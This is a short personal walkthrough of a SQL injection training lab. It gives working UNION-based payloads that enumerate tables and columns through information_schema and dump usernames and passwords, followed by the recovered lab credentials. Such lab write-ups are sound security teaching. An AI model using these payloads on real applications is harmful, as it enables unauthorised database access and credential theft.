# Lab: SQL injection attack, listing the database contents on non-Oracle databases.

- This lab contains a SQL injection vulnerability in the product category filter.
- The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

- The application has a login function, and the database contains a table that holds usernames and passwords.
- You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

## To solve the lab, log in as the `administrator` user.

# Use Burp Suite to intercept and modify the request that sets the product category filter.

# Determine the number of columns that are being returned by the query and which columns contain text data.

# check columns
```
' UNION SELECT NULL,NULL--
```
- there are two columns.

# check which column contain text
```
'UNION SELECT NULL,'def'--
'UNION SELECT 'abc',NULL--
'UNION SELECT 'abc','def'--
```
- Both contains text.

# use this payload to reterive the list of table in database.
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

## find user tables
- users_abtzap

# Use the following payload to retrieve the details of the columns in the table:
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abtzap'--
```
- this payload display all columns in a given table.

# Find the names of the columns containing usernames and passwords.
- email
- username_uusmxd
- password_hlcowd

## To retrieve the usernames and passwords for all users
```
'+UNION+SELECT+username_uusmxd,+password_hlcowd+FROM+users_abtzap--
```

## here we go, we get user names and pasword
- administrator : 9h7kg228qoj2nhy8k7l7
- wiener : muo8vr1d7lingkdqut7u
- carlos : 9ybdmm4nq18kamujgdos

# Login as a administrator

# lab solved :)